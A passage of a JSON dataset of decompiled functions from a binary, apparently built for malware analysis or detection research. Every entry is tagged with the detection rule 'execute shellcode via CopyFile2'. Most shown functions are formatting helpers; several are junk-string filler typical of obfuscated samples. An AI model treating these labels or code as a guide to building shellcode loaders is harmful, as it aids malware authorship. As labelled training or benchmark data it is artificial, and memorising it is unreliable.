fcn.00406622();\n    if (cVar1 != '\\0') {\n        uVar3 = *(in_ECX + 0x20);\n        arg_ch_00 = var_8h;\n        arg_8h_00 = var_ch;\n        if ((((uVar3 >> 4 & 1) != 0) && (var_8h < 1)) && (var_8h < 0)) {\n            uVar3 = uVar3 | 0x40;\n            *(in_ECX + 0x20) = uVar3;\n            arg_ch_00 = -(var_8h + (var_ch != 0));\n            arg_8h_00 = -var_ch;\n        }\n        if (*(in_ECX + 0x28) < 0) {\n            *(in_ECX + 0x28) = 1;\n        }\n        else {\n            *(in_ECX + 0x20) = uVar3 & 0xfffffff7;\n            fcn.00404c50(*(in_ECX + 0x28));\n        }\n        if ((arg_8h_00 | arg_ch_00) == 0) {\n            *(in_ECX + 0x20) = *(in_ECX + 0x20) & 0xffffffdf;\n        }\n        *(in_ECX + 0x3c) = 0;\n        if (var_4h == 8) {\n            fcn.004012d0(arg_8h_00, arg_ch_00, arg_8h, arg_ch);\n        }\n        else {\n            fcn.00402d6f(arg_8h_00, arg_8h, arg_ch);\n        }\n        if (((*(in_ECX + 0x20) >> 7 & 1) != 0) && ((*(in_ECX + 0x38) == 0 || (**(in_ECX + 0x34) != '0')))) {\n            *(in_ECX + 0x34) = *(in_ECX + 0x34) + -1;\n            **(in_ECX + 0x34) = 0x30;\n            *(in_ECX + 0x38) = *(in_ECX + 0x38) + 1;\n        }\n    }\n    return 1;\n}\n",
        "token_count": 1021
    },
    "0040385a": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738",
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nuint __cdecl fcn.0040385a(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t **in_FS_OFFSET;\n    int32_t iStack116;\n    int32_t *piStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_ch;\n    \n    uStack24 = 0xffffffff;\n    uStack28 = 0x450360;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack32;\n    fcn.00401e79(\"igkzrfdcakyqujsxtohmccolaandcftczhxdtlfkno\");\n    for (iStack116 = 0x2f; 0 < iStack116; iStack116 = iStack116 + -1) {\n    }\n    uStack24 = 0;\n    fcn.00401e79(\"sgccpypsrbk\");\n    fcn.00403b02();\n    *in_FS_OFFSET = piStack32;\n    return arg_8h;\n}\n",
        "token_count": 249
    },
    "004038fa": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_28h\n\nvoid __fastcall fcn.004038fa(int32_t *param_1)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t var_28h;\n    uint var_24h;\n    uint32_t var_4h;\n    \n    var_4h = *0x571ca8 ^ &stack0xfffffffc;\n    if ((param_1[0xe] != 0) && (*(param_1 + 0x3d) != '\\0')) {\n        pcVar1 = *(*param_1 + 0xc);\n        (**0x578000)(0xffffffff);\n        iVar2 = (*pcVar1)();\n        if (iVar2 != -1) {\n            pcVar1 = *(*param_1[0xe] + 0x20);\n            (**0x578000)(param_1 + 0x10, &var_24h, &var_4h, &var_28h);\n            iVar2 = (*pcVar1)();\n            if (iVar2 == 0) {\n                *(param_1 + 0x3d) = 0;\n            }\n            else if (iVar2 != 1) {\n                if (iVar2 == 3) {\n                    *(param_1 + 0x3d) = 0;\n                }\n                goto code_r0x00463848;\n            }\n            iVar2 = var_28h - &var_24h;\n            if (iVar2 != 0) {\n                fcn.0040200e(&var_24h, 1, iVar2, param_1[0x13]);\n            }\n        }\n    }\ncode_r0x00463848:\n    fcn.004030bc(var_28h);\n    return;\n}\n",
        "token_count": 392
    },
    "004039d6": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nuint __fastcall fcn.004039d6(uint *param_1)\n\n{\n    char *pcVar1;\n    char cVar2;\n    uint *puVar3;\n    uint arg_18h;\n    uint arg_14h;\n    uint arg_10h;\n    char *pcVar4;\n    uint arg_20h;\n    uint arg_24h;\n    uint noname_8;\n    uint arg_2ch;\n    uint arg_30h;\n    int32_t iVar5;\n    uint *var_8h;\n    uint *var_4h;\n    \n    param_1[8] = param_1[8] | 0x10;\n    iVar5 = param_1[10];\n    if (iVar5 < 0) {\n        if ((*(param_1 + 0x31) == 'a') || (*(param_1 + 0x31) == 'A')) {\n            iVar5 = 0xd;\n        }\n        else {\n            iVar5 = 6;\n        }\n        param_1[10] = iVar5;\n    }\n    else if ((iVar5 == 0) && ((*(param_1 + 0x31) == 'g' || (iVar5 = 0,  *(param_1 + 0x31) == 'G')))) {\n        param_1[10] = 1;\n        iVar5 = 1;\n    }\n    var_8h = param_1;\n    var_4h = param_1;\n    cVar2 = fcn.00404c50(iVar5 + 0x15d);\n    if (cVar2 == '\\0') {\n        iVar5 = fcn.004059cf();\n        param_1[10] = iVar5 + -0x15d;\n    }\n    puVar3 = param_1[0x111];\n    if (param_1[0x111] == NULL) {\n        puVar3 = param_1 + 0x10;\n    }\n    param_1[0xd] = puVar3;\n    param_1[5] = param_1[5] + 8;\n    var_8h = *(param_1[5] + -8);\n    var_4h = *(param_1[5] + -4);\n    arg_18h = fcn.004059cf();\n    puVar3 = param_1[0x111];\n    if (param_1[0x111] == NULL) {\n        puVar3 = param_1 + 0x10;\n    }\n    iVar5 = *(param_1 + 0x31);\n    arg_30h = 1;\n    arg_2ch = param_1[2];\n    noname_8 = param_1[1];\n    arg_24h = *param_1;\n    arg_20h = param_1[10];\n    arg_14h = fcn.0040312f();\n    arg_10h = fcn.004059cf();\n    fcn.004041f6(&var_8h, puVar3, arg_10h, arg_14h, arg_18h, iVar5, arg_20h, arg_24h, noname_8, arg_2ch, arg_30h);\n    if (((param_1[8] >> 5 & 1) != 0) && (param_1[10] == 0)) {\n        fcn.004022f2(param_1[0xd], param_1[2]);\n    }\n    if (((*(param_1 + 0x31) == 'g') || (*(param_1 + 0x31) == 'G')) && ((param_1[8] >> 5 & 1) == 0)) {\n        fcn.00405bf5(param_1[0xd], param_1[2]);\n    }\n    pcVar4 = param_1[0xd];\n    cVar2 = *pcVar4;\n    if (cVar2 == '-') {\n        param_1[8] = param_1[8] | 0x40;\n        pcVar4 = pcVar4 + 1;\n        param_1[0xd] = pcVar4;\n        cVar2 = *pcVar4;\n    }\n    if (((cVar2 == 'i') || (cVar2 == 'I')) || ((cVar2 == 'n' || (cVar2 == 'N')))) {\n        param_1[8] = param_1[8] & 0xfffffff7;\n        *(param_1 + 0x31) = 0x73;\n    }\n    pcVar1 = pcVar4 + 1;\n    do {\n        cVar2 = *pcVar4;\n        pcVar4 = pcVar4 + 1;\n    } while (cVar2 != '\\0');\n    param_1[0xe] = pcVar4 - pcVar1;\n    return 1;\n}\n",
        "token_count": 1080
    },
    "00403b7a": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00403b7a(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    char extraout_CL;\n    char cVar2;\n    int32_t in_ECX;\n    int32_t iVar3;\n    int64_t iVar4;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar4 = CONCAT44(arg_ch, arg_8h);\n    iVar3 = *(in_ECX + 0x444);\n    if (*(in_ECX + 0x444) == 0) {\n        iVar3 = in_ECX + 0x40;\n    }\n    iVar1 = fcn.004059cf();\n    iVar3 = iVar3 + iVar1 + -1;\n    *(in_ECX + 0x34) = iVar3;\n    iVar1 = iVar3;\n    while ((0 < *(in_ECX + 0x28) || (iVar4 != 0))) {\n        *(in_ECX + 0x28) = *(in_ECX + 0x28) + -1;\n        iVar4 = fcn.00401820(iVar4, arg_10h, 0, iVar4 >> 0x20);\n        cVar2 = extraout_CL + '0';\n        if ('9' < cVar2) {\n            cVar2 = cVar2 + (arg_14h ^ 1) * ' ' + '\\a';\n        }\n        **(in_ECX + 0x34) = cVar2;\n        *(in_ECX + 0x34) = *(in_ECX + 0x34) + -1;\n        iVar1 = *(in_ECX + 0x34);\n    }\n    *(in_ECX + 0x38) = iVar3 - iVar1;\n    *(in_ECX + 0x34) = *(in_ECX + 0x34) + 1;\n    return;\n}\n",
        "token_count": 434
    },
    "00403ba2": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00403ba2(uint *param_1)\n\n{\n    char *pcVar1;\n    char cVar2;\n    uint *puVar3;\n    uint arg_18h;\n    uint arg_14h;\n    uint arg_10h;\n    char *pcVar4;\n    uint arg_20h;\n    uint arg_24h;\n    uint noname_8;\n    uint arg_2ch;\n    uint arg_30h;\n    int32_t iVar5;\n    uint *var_8h;\n    uint *var_4h;\n    \n    param_1[8] = param_1[8] | 0x10;\n    iVar5 = param_1[10];\n    if (iVar5 < 0) {\n        if ((*(param_1 + 0x31) == 'a') || (*(param_1 + 0x31) == 'A')) {\n            iVar5 = 0xd;\n        }\n        else {\n            iVar5 = 6;\n        }\n        param_1[10] = iVar5;\n    }\n    else if ((iVar5 == 0) && ((*(param_1 + 0x31) == 'g' || (iVar5 = 0,  *(param_1 + 0x31) == 'G')))) {\n        param_1[10] = 1;\n        iVar5 = 1;\n    }\n    var_8h = param_1;\n    var_4h = param_1;\n    cVar2 = fcn.00404c50(iVar5 + 0x15d);\n    if (cVar2 == '\\0') {\n        iVar5 = fcn.004059cf();\n        param_1[10] = iVar5 + -0x15d;\n    }\n    puVar3 = param_1[0x111];\n    if (param_1[0x111] == NULL) {\n        puVar3 = param_1 + 0x10;\n    }\n    param_1[0xd] = puVar3;\n    param_1[5] = param_1[5] + 8;\n    var_8h = *(param_1[5] + -8);\n    var_4h = *(param_1[5] + -4);\n    arg_18h = fcn.004059cf();\n    puVar3 = param_1[0x111];\n    if (param_1[0x111] == NULL) {\n        puVar3 = param_1 + 0x10;\n    }\n    iVar5 = *(param_1 + 0x31);\n    arg_30h = 1;\n    arg_2ch = param_1[2];\n    noname_8 = param_1[1];\n    arg_24h = *param_1;\n    arg_20h = param_1[10];\n    arg_14h = fcn.0040312f();\n    arg_10h = fcn.004059cf();\n    fcn.004041f6(&var_8h, puVar3, arg_10h, arg_14h, arg_18h, iVar5, arg_20h, arg_24h, noname_8, arg_2ch, arg_30h);\n    if (((param_1[8] >> 5 & 1) != 0) && (param_1[10] == 0)) {\n        fcn.004022f2(param_1[0xd], param_1[2]);\n    }\n    if (((*(param_1 + 0x31) == 'g') || (*(param_1 + 0x31) == 'G')) && ((param_1[8] >> 5 & 1) == 0)) {\n        fcn.00405bf5(param_1[0xd], param_1[2]);\n    }\n    pcVar4 = param_1[0xd];\n    cVar2 = *pcVar4;\n    if (cVar2 == '-') {\n        param_1[8] = param_1[8] | 0x40;\n        pcVar4 = pcVar4 + 1;\n        param_1[0xd] = pcVar4;\n        cVar2 = *pcVar4;\n    }\n    if (((cVar2 == 'i') || (cVar2 == 'I')) || ((cVar2 == 'n' || (cVar2 == 'N')))) {\n        param_1[8] = param_1[8] & 0xfffffff7;\n        *(param_1 + 0x31) = 0x73;\n    }\n    pcVar1 = pcVar4 + 1;\n    do {\n        cVar2 = *pcVar4;\n        pcVar4 = pcVar4 + 1;\n    } while (cVar2 != '\\0');\n    param_1[0xe] = pcVar4 - pcVar1;\n    return 1;\n}\n",
        "token_count": 1080
    },
    "00403dcd": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738",
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nuint __cdecl fcn.00403dcd(uint arg_8h)\n\n{\n    int32_t **in_FS_OFFSET;\n    int32_t *piStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_ch;\n    \n    uStack28 = 0x450a40;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack32;\n    uStack24 = 0;\n    fcn.00401e79(\"jirgpfarrlymhzvypuykdnflklxvasiuxpvszziccudotjcywmqcakvezkpqwvhiheloiuwznjtwjqjzlbqakxyxefyjmafkqas\");\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = piStack32;\n    return 1;\n}\n",
        "token_count": 208
    },
    "00403e40": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738",
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nuint __cdecl fcn.00403e40(uint arg_8h)\n\n{\n    int32_t **in_FS_OFFSET;\n    int32_t iStack136;\n    int32_t iStack132;\n    int32_t *piStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_ch;\n    \n    uStack28 = 0x450460;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack32;\n    uStack24 = 1;\n    fcn.00401e79(\"mydsjicfhnsmmianvzedvzelxhdigshpqnfsuobj\");\n    uStack24 = 2;\n    fcn.00401e79(\"xecxnzobobohmpdbxpejnttrnghhtyfjmqsehbspdkdswtelpcrivrszyjvvuagmrtscvyzoydphihwsadgs\");\n    for (iStack132 = 0x26; 0 < iStack132; iStack132 = iStack132 + -1) {\n    }\n    for (iStack136 = 0xd; 0 < iStack136; iStack136 = iStack136 + -1) {\n    }\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = piStack32;\n    return 0x17a2f;\n}\n",
        "token_count": 344
    },
    "00403e77": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00403e77(uint32_t arg_8h, uint32_t arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    char cVar2;\n    int32_t iVar3;\n    \n    iVar3 = *(in_ECX + 0x444);\n    if (*(in_ECX + 0x444) == 0) {\n        iVar3 = in_ECX + 0x40;\n    }\n    iVar1 = fcn.004059cf();\n    iVar3 = iVar3 + iVar1 + -1;\n    *(in_ECX + 0x34) = iVar3;\n    iVar1 = iVar3;\n    while ((0 < *(in_ECX + 0x28) || (arg_8h != 0))) {\n        *(in_ECX + 0x28) = *(in_ECX + 0x28) + -1;\n        cVar2 = arg_8h % arg_ch + '0';\n        if ('9' < cVar2) {\n            cVar2 = cVar2 + (arg_10h ^ 1) * ' ' + '\\a';\n        }\n        **(in_ECX + 0x34) = cVar2;\n        *(in_ECX + 0x34) = *(in_ECX + 0x34) + -1;\n        iVar1 = *(in_ECX + 0x34);\n        arg_8h = arg_8h / arg_ch;\n    }\n    *(in_ECX + 0x38) = iVar3 - iVar1;\n    *(in_ECX + 0x34) = *(in_ECX + 0x34) + 1;\n    return;\n}\n",
        "token_count": 380
    },
    "00403f71": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00403f71(uint arg_8h, uint arg_ch)\n\n{\n    char cVar1;\n    uint *puVar2;\n    int32_t in_ECX;\n    uint32_t uVar3;\n    uint32_t arg_ch_00;\n    uint32_t arg_8h_00;\n    uint32_t var_ch;\n    uint32_t var_8h;\n    int32_t var_4h;\n    \n    var_4h = fcn.00402798(*(in_ECX + 0x2c));\n    var_ch = 0;\n    var_8h = 0;\n    if (var_4h == 1) {\n        if ((*(in_ECX + 0x20) >> 4 & 1) == 0) {\n            cVar1 = fcn.00405fe2(&var_ch);\n        }\n        else {\n            cVar1 = fcn.0040162c(&var_ch);\n        }\n    }\n    else if (var_4h == 2) {\n        if ((*(in_ECX + 0x20) >> 4 & 1) == 0) {\n            cVar1 = fcn.004039b3(&var_ch);\n        }\n        else {\n            cVar1 = fcn.00402a45(&var_ch);\n        }\n    }\n    else if (var_4h == 4) {\n        if ((*(in_ECX + 0x20) >> 4 & 1) == 0) {\n            cVar1 = fcn.00403413(&var_ch);\n        }\n        else {\n            cVar1 = fcn.0040618b(&var_ch);\n        }\n    }\n    else {\n        if (var_4h != 8) {\n            puVar2 = fcn.00403a35();\n            *puVar2 = 0x16;\n            fcn.004037ce();\n            return 0;\n        }\n        if ((*(in_ECX + 0x20) >> 4 & 1) == 0) {\n            cVar1 = fcn.004042be(&var_ch);\n        }\n        else {\n            cVar1 = fcn.00405d30(&var_ch);\n        }\n    }\n    if (cVar1 == '\\0') {\n        return 0;\n    }\n    cVar1 = fcn.00404331();\n    if (cVar1 != '\\0') {\n        uVar3 = *(in_ECX + 0x20);\n        arg_ch_00 = var_8h;\n        arg_8h_00 = var_ch;\n        if ((((uVar3 >> 4 & 1) != 0) && (var_8h < 1)) && (var_8h < 0)) {\n            uVar3 = uVar3 | 0x40;\n            *(in_ECX + 0x20) = uVar3;\n            arg_ch_00 = -(var_8h + (var_ch != 0));\n            arg_8h_00 = -var_ch;\n        }\n        if (*(in_ECX + 0x28) < 0) {\n            *(in_ECX + 0x28) = 1;\n        }\n        else {\n            *(in_ECX + 0x20) = uVar3 & 0xfffffff7;\n            fcn.004058a3(*(in_ECX + 0x28));\n        }\n        if ((arg_8h_00 | arg_ch_00) == 0) {\n            *(in_ECX + 0x20) = *(in_ECX + 0x20) & 0xffffffdf;\n        }\n        *(in_ECX + 0x3c) = 1;\n        if (var_4h == 8) {\n            fcn.00406a0a(arg_8h_00, arg_ch_00, arg_8h, arg_ch);\n        }\n        else {\n            fcn.0040124e(arg_8h_00, arg_8h, arg_ch);\n        }\n        if (((*(in_ECX + 0x20) >> 7 & 1) != 0) && ((*(in_ECX + 0x38) == 0 || (**(in_ECX + 0x34) != 0x30)))) {\n            *(in_ECX + 0x34) = *(in_ECX + 0x34) + -2;\n            **(in_ECX + 0x34) = 0x30;\n            *(in_ECX + 0x38) = *(in_ECX + 0x38) + 1;\n        }\n    }\n    return 1;\n}\n",
        "token_count": 1023
    },
    "00403fb7": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00403fb7(uint32_t arg_8h, uint32_t arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    int32_t iVar2;\n    uint32_t uVar3;\n    \n    iVar2 = *(in_ECX + 0x444);\n    if (*(in_ECX + 0x444) == 0) {\n        iVar2 = in_ECX + 0x40;\n    }\n    iVar1 = fcn.00403b57();\n    iVar1 = iVar2 + iVar1 * 2 + -2;\n    *(in_ECX + 0x34) = iVar1;\n    iVar2 = iVar1;\n    while ((0 < *(in_ECX + 0x28) || (arg_8h != 0))) {\n        *(in_ECX + 0x28) = *(in_ECX + 0x28) + -1;\n        uVar3 = arg_8h % arg_ch + 0x30 & 0xffff;\n        if (0x39 < uVar3) {\n            uVar3 = (arg_10h ^ 1) * ' ' + '\\a' + uVar3;\n        }\n        **(in_ECX + 0x34) = uVar3;\n        *(in_ECX + 0x34) = *(in_ECX + 0x34) + -2;\n        iVar2 = *(in_ECX + 0x34);\n        arg_8h = arg_8h / arg_ch;\n    }\n    *(in_ECX + 0x38) = iVar1 - iVar2 >> 1;\n    *(in_ECX + 0x34) = *(in_ECX + 0x34) + 2;\n    return;\n}\n",
        "token_count": 397
    },
    "0040402f": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738",
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nfloat10 __cdecl fcn.0040402f(uint arg_8h)\n\n{\n    int32_t **in_FS_OFFSET;\n    int32_t iStack84;\n    int32_t *piStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_ch;\n    \n    uStack28 = 0x450420;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack32;\n    uStack24 = 0;\n    fcn.00401e79(\"hetpvvaxueodscsibywtwyoehjpabtmpwyfvl\");\n    for (iStack84 = 0x49; 0 < iStack84; iStack84 = iStack84 + -1) {\n    }\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = piStack32;\n    return *0x546c74;\n}\n",
        "token_count": 218
    },
    "004040ac": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nuint __fastcall fcn.004040ac(uint *param_1)\n\n{\n    char *pcVar1;\n    char cVar2;\n    uint *puVar3;\n    uint uVar4;\n    uint arg_14h;\n    uint arg_10h;\n    char *pcVar5;\n    uint arg_20h;\n    uint arg_24h;\n    uint noname_8;\n    uint arg_2ch;\n    uint arg_30h;\n    int32_t iVar6;\n    uint *var_8h;\n    uint *var_4h;\n    \n    param_1[8] = param_1[8] | 0x10;\n    var_8h = param_1;\n    var_4h = param_1;\n    cVar2 = fcn.00405ee3();\n    if (cVar2 == '\\0') {\ncode_r0x004a4286:\n        uVar4 = 0;\n    }\n    else {\n        cVar2 = fcn.004059b1();\n        if (cVar2 != '\\0') {\n            iVar6 = param_1[10];\n            if (iVar6 < 0) {\n                if ((*(param_1 + 0x32) == 0x61) || (*(param_1 + 0x32) == 0x41)) {\n                    iVar6 = 0xd;\n                }\n                else {\n                    iVar6 = 6;\n                }\n                param_1[10] = iVar6;\n            }\n            else if ((iVar6 == 0) && ((*(param_1 + 0x32) == 0x67 || (iVar6 = 0,  *(param_1 + 0x32) == 0x47)))) {\n                param_1[10] = 1;\n                iVar6 = 1;\n            }\n            cVar2 = fcn.00404c50(iVar6 + 0x15d);\n            if (cVar2 == '\\0') {\n                iVar6 = fcn.004059cf();\n                param_1[10] = iVar6 + -0x15d;\n            }\n            puVar3 = param_1[0x111];\n            if (param_1[0x111] == NULL) {\n                puVar3 = param_1 + 0x10;\n            }\n            var_8h = NULL;\n            var_4h = NULL;\n            param_1[0xd] = puVar3;\n            cVar2 = fcn.00401014(&var_8h);\n            if (cVar2 == '\\0') goto code_r0x004a4286;\n            uVar4 = fcn.004059cf();\n            puVar3 = param_1[0x111];\n            if (param_1[0x111] == NULL) {\n                puVar3 = param_1 + 0x10;\n            }\n            iVar6 = *(param_1 + 0x32);\n            arg_30h = 1;\n            arg_2ch = param_1[2];\n            noname_8 = param_1[1];\n            arg_24h = *param_1;\n            arg_20h = param_1[10];\n            arg_14h = fcn.0040312f();\n            arg_10h = fcn.004059cf();\n            fcn.004041f6(&var_8h, puVar3, arg_10h, arg_14h, uVar4, iVar6, arg_20h, arg_24h, noname_8, arg_2ch, arg_30h);\n            if (((param_1[8] >> 5 & 1) != 0) && (param_1[10] == 0)) {\n                fcn.004022f2(param_1[0xd], param_1[2]);\n            }\n            if (((*(param_1 + 0x32) == 0x67) || (*(param_1 + 0x32) == 0x47)) && ((param_1[8] >> 5 & 1) == 0)) {\n                fcn.00405bf5(param_1[0xd], param_1[2]);\n            }\n            pcVar5 = param_1[0xd];\n            cVar2 = *pcVar5;\n            if (cVar2 == '-') {\n                param_1[8] = param_1[8] | 0x40;\n                pcVar5 = pcVar5 + 1;\n                param_1[0xd] = pcVar5;\n                cVar2 = *pcVar5;\n            }\n            if (((cVar2 == 'i') || (cVar2 == 'I')) || ((cVar2 == 'n' || (cVar2 == 'N')))) {\n                param_1[8] = param_1[8] & 0xfffffff7;\n                *(param_1 + 0x32) = 0x73;\n            }\n            pcVar1 = pcVar5 + 1;\n            do {\n                cVar2 = *pcVar5;\n                pcVar5 = pcVar5 + 1;\n            } while (cVar2 != '\\0');\n            param_1[0xe] = pcVar5 - pcVar1;\n        }\n        uVar4 = 1;\n    }\n    return uVar4;\n}\n",
        "token_count": 1170
    },
    "004040b1": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.004040b1(uint *param_1)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint *puVar4;\n    uint *var_4h;\n    \n    param_1[5] = param_1[5] + 4;\n    puVar4 = param_1 + 0x10;\n    *(param_1 + 0xf) = 1;\n    var_4h._0_2_ = *(param_1[5] + -4);\n    var_4h = param_1;\n    cVar1 = fcn.00401893(*param_1, param_1[1], *(param_1 + 0x32), param_1[0xb]);\n    if (cVar1 == '\\0') {\n        var_4h._0_2_ = var_4h & 0xff;\n        var_4h = var_4h & 0xffff0000 | var_4h;\n        puVar3 = param_1[0x111];\n        if (param_1[0x111] == NULL) {\n            puVar3 = puVar4;\n        }\n        iVar2 = fcn.0040105a(puVar3, &var_4h, *(*param_1[2] + 4), param_1[2]);\n        if (iVar2 < 0) {\n            *(param_1 + 0xc) = 1;\n        }\n    }\n    else {\n        puVar3 = param_1[0x111];\n        if (param_1[0x111] == NULL) {\n            puVar3 = puVar4;\n        }\n        *puVar3 = var_4h;\n    }\n    puVar3 = param_1[0x111];\n    if (puVar3 != NULL) {\n        puVar4 = puVar3;\n    }\n    param_1[0xd] = puVar4;\n    param_1[0xe] = 1;\n    return CONCAT31(puVar3 >> 8, 1);\n}\n",
        "token_count": 470
    },
    "00404183": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00404183(uint *param_1)\n\n{\n    char cVar1;\n    uint32_t arg_14h;\n    uint arg_10h;\n    int32_t iVar2;\n    uint *puVar3;\n    uint *puVar4;\n    uint arg_18h;\n    \n    puVar4 = param_1 + 0x10;\n    cVar1 = fcn.004047f5(*param_1, param_1[1], *(param_1 + 0x31), param_1[0xb]);\n    if (cVar1 == '\\0') {\n        puVar3 = param_1[0x111];\n        if (param_1[0x111] == NULL) {\n            puVar3 = puVar4;\n        }\n        param_1[5] = param_1[5] + 4;\n        *puVar3 = *(param_1[5] + -4);\n        param_1[0xe] = 1;\n    }\n    else {\n        param_1[5] = param_1[5] + 4;\n        arg_14h = *(param_1[5] + -4);\n        puVar3 = param_1[0x111];\n        if (param_1[0x111] == NULL) {\n            puVar3 = puVar4;\n        }\n        arg_18h = param_1[2];\n        arg_10h = fcn.004059cf();\n        iVar2 = fcn.00401f78(param_1 + 0xe, puVar3, arg_10h, arg_14h, arg_18h);\n        if (iVar2 != 0) {\n            *(param_1 + 0xc) = 1;\n        }\n    }\n    puVar3 = param_1[0x111];\n    if (puVar3 != NULL) {\n        puVar4 = puVar3;\n    }\n    param_1[0xd] = puVar4;\n    return CONCAT31(puVar3 >> 8, 1);\n}\n",
        "token_count": 452
    },
    "004041ba": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738",
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.004041ba(uint arg_8h)\n\n{\n    int32_t **in_FS_OFFSET;\n    int32_t iStack76;\n    int32_t *piStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_ch;\n    \n    uStack28 = 0x450f00;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack32;\n    uStack24 = 0;\n    fcn.00401e79(\"baglgzynliytfplztiwadajxm\");\n    for (iStack76 = 0x23; 0 < iStack76; iStack76 = iStack76 + -1) {\n    }\n    uStack24 = 1;\n    fcn.00401e79(\"xatdhxpzacstwhgyiio\");\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = piStack32;\n    return arg_8h;\n}\n",
        "token_count": 252
    },
    "004042a0": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
